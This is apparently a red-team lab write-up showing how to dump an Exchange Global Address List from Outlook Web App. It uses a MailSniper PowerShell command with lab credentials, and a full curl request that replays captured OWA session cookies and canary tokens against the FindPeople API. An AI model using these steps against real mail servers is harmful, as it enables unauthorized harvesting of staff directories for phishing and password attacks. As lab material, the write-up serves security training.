# Dump GAL from OWA

This lab uses MailSniper to dump Global Address List \(GAL\) off the Outlook Web Application \(OWA\).

GAL - in layman terms is simply an address book of all the people that are known to the Exchange mail server. You know those auto suggestions when you are typing in the email address in the TO field in your email client - they are coming from the GAL.

What Microsoft says about GAL:

> **Global address lists \(GALs\)**: The built-in GAL that's automatically created by Exchange includes every mail-enabled object in the Active Directory forest. You can create additional GALs to separate users by organization or location, but a user can only see and use one GAL.
>
> [https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019](https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019)

## Execution

Import the MailSniper module and dump the GAL, provided you have at least one set of working credentials:

{% code title="attacker@local" %}
```csharp
. MailSniper.ps1
Get-GlobalAddressList -ExchHostname dc01.offense.local -UserName offense\spotless -Password 123456
```
{% endcode %}

![GAL successfully dumped](../../.gitbook/assets/screenshot-from-2019-01-15-18-58-46.png)

When looking at the contacts through the OWA UI, as mentioned in Blackhill Security article, `GetPeopleFilters` API is called to retrieve the `AddressListID`:

![](../../.gitbook/assets/screenshot-from-2019-01-15-20-16-39.png)

It is then passed to `FindPeople` API:

![](../../.gitbook/assets/screenshot-from-2019-01-15-20-21-13.png)

...which in turn retrieves a JSON object with contacts from the GAL

![](../../.gitbook/assets/screenshot-from-2019-01-15-19-03-13.png)

If you are interested in the JSON only \(most likely\), just switch to the Response tab:

![](../../.gitbook/assets/screenshot-from-2019-01-15-20-12-57%20%281%29.png)

If you have logged on to the OWA UI, you could also dump the JSON via CURL in bash:

{% code title="attacker@kali" %}
```bash
curl 'https://dc01/owa/service.svc?action=FindPeople' -X POST -H 'Cookie: X-BackEndCookie=S-1-5-21-2552734371-813931464-1050690807-500=u56Lnp2ejJqBnszNmc/KnszSm5qZztLLnszH0seZy8bSnpudypzJzs3Pyc7GgYHNz87G0s/N0s7Lq87Gxc/PxczO&S-1-5-21-2552734371-813931464-1050690807-1106=u56Lnp2ejJqBnszNmc/KnszSm5qZztLLnszH0seZy8bSnpudypzJzs3Pyc7GgYHNz87G0s/O0s3Hq8/PxcvPxc/O; ClientId=TFFPI9GMPEWAPEYPZVIWXQ; PrivateComputer=true; PBack=0; cadata=ESW2hf2tJL2L7Czb69B+/VNo0l5+rM6POPTUJIv0Vj7vsXMUvbqXzNpIkl/GylwMQG4QQg9Y8PkjGlJXU94tEis0V03jSVdgBVUnhOm2cLE=; cadataTTL=lWhZTkknWXOawVEzMk2O5w==; cadataKey=J2xUs5cK+VfEie4cIY6lUI2mE/TkCnmPNm8GY8rJN4x0eZzPLJG5L6igl8y19Xy+i2nKIwKASgtsA8IhZ3uXHuPbd5QYpDZ0YB2yPwTxYCHmUcYWbwBnbt08EFJrAfUL1je4rYgk1iQ43za/S0q0j3Rk1bMqSG6Puk3h0cWkTh4sJ2TtJ/h2UypAVVcIzPZTicLTreFK9JfabW30+r4M+AeQQUGuFXof1iTsPx8TffjSXHeTa3rg+hTh8yZJKXieRfL9YSssSU1g+zRp09w2HqXvtqm0vtXrcCF7jLB3jBzSbC1KtQ+bYPoYQduxvhFS6TV2L8ky421wukMslBV9nQ==; cadataIV=LT7ecWINf5C9N2D4rIA8A1HcR936GFTNMtH3bVI/qr8UR0oi1+yhITjYBg1XIqt4W2YM+qPFXhKQrA0ExhlsObjAdd3KnExbAZwlLoz1YMLTo+tEKhpa6zSKjHvWsPwCZdRuXIOhvUeIyUA6XqpT/ALuCM+QzrY4K96CkkOhl276SAwqTO8cJ++9BdrF7Jcz2e0lWjdPyaXcCj7xCY7Ku6ci8SU2jfohVhUDJYJJo7DURhvLg8jto3r7Wihx2xk7/36V8SjFjz7PDhXiGKqHJltq9erLqXeNPmdZ1pwIxHywbwGNCYxdsnIrkrFRE9DRTiKrpGv2zLEz3LpcA/oBLA==; cadataSig=crGDgMGnHI1qkLJecj9/CHvQqjn8zYtdBTTU3HpszGTRysm+5JL80TnWuedWVPh3XQMFuyUdobef4WBJ3t1waLhBSGIPJSxis8fxCwChZ4nDgRlvnU4N8MJMwmw2l8dHCQTb950FGZYeuwiTxTwVQcHUwvtNQ6urkf4jlqro24G386GvPPXXpvjwZAfimSitjfzO4AucI1lv1Qbt6psmPnMphNDtn3n3R/eKvGPJWPT12DQOO4/qeyhv1Idtmi7QGSqASSQXNwP+Dtn0WPb2+RPtu3dhNf/KC+3babolnTavkYc/ioIVhHUA9J7mO8XX+c+0E94vBI1DYjJVOV2QUg==; ASP.NET_SessionId=0476a55e-b193-4001-ba25-214c7aa1ebc2; TimeOffset=0; Eac_CmdletLogging=false; UC=df6d6d163ec4477cb1b5ee11d6fcd5ae; AppcacheVer=15.1.225.42:en-uswrld; X-OWA-CANARY=DGcjQo94fESiIolOxDka23AinLgbe9YIJCe8-7U7KhN9-2OKKXNACOK61kwxroUcki4YMtH51O4.' -H 'Origin: https://dc01' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'X-OWA-UrlPostData: %7B%22__type%22%3A%22FindPeopleJsonRequest%3A%23Exchange%22%2C%22Header%22%3A%7B%22__type%22%3A%22JsonRequestHeaders%3A%23Exchange%22%2C%22RequestServerVersion%22%3A%22Exchange2013%22%2C%22TimeZoneContext%22%3A%7B%22__type%22%3A%22TimeZoneContext%3A%23Exchange%22%2C%22TimeZoneDefinition%22%3A%7B%22__type%22%3A%22TimeZoneDefinitionType%3A%23Exchange%22%2C%22Id%22%3A%22GMT%20Standard%20Time%22%7D%7D%7D%2C%22Body%22%3A%7B%22__type%22%3A%22FindPeopleRequest%3A%23Exchange%22%2C%22IndexedPageItemView%22%3A%7B%22__type%22%3A%22IndexedPageView%3A%23Exchange%22%2C%22BasePoint%22%3A%22Beginning%22%2C%22Offset%22%3A0%2C%22MaxEntriesReturned%22%3A50%7D%2C%22QueryString%22%3Anull%2C%22ParentFolderId%22%3A%7B%22__type%22%3A%22TargetFolderId%3A%23Exchange%22%2C%22BaseFolderId%22%3A%7B%22__type%22%3A%22AddressListId%3A%23Exchange%22%2C%22Id%22%3A%224ee5c1bc-232a-4edb-b5e0-3596da3b7e05%22%7D%7D%2C%22PersonaShape%22%3A%7B%22__type%22%3A%22PersonaResponseShape%3A%23Exchange%22%2C%22BaseShape%22%3A%22Default%22%2C%22AdditionalProperties%22%3A%5B%7B%22__type%22%3A%22PropertyUri%3A%23Exchange%22%2C%22FieldURI%22%3A%22PersonaAttributions%22%7D%5D%7D%2C%22ShouldResolveOneOffEmailAddress%22%3Afalse%2C%22SearchPeopleSuggestionIndex%22%3Afalse%7D%7D' -H 'Action: FindPeople' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'X-OWA-CANARY: DGcjQo94fESiIolOxDka23AinLgbe9YIJCe8-7U7KhN9-2OKKXNACOK61kwxroUcki4YMtH51O4.' -H 'Content-Length: 0' -H 'X-OWA-ActionName: BrowseInDirectory' -H 'X-OWA-ActionId: -34' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'Content-Type: application/json; charset=UTF-8' -H 'Accept: */*' -H 'X-OWA-ClientBuildVersion: 15.1.225.42' -H 'X-OWA-CorrelationId: TFFPI9GMPEWAPEYPZVIWXQ_154757883153962' -H 'X-OWA-ClientBegin: 2019-01-15T19:00:31.539' -H 'X-OWA-Attempt: 1' --compressed --insecure
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2019-01-15-19-26-46%20%281%29.png)

## References

[https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)

{% embed url="https://www.blackhillsinfosec.com/downloading-an-address-book-from-an-outlook-web-app-owa-portal/" %}



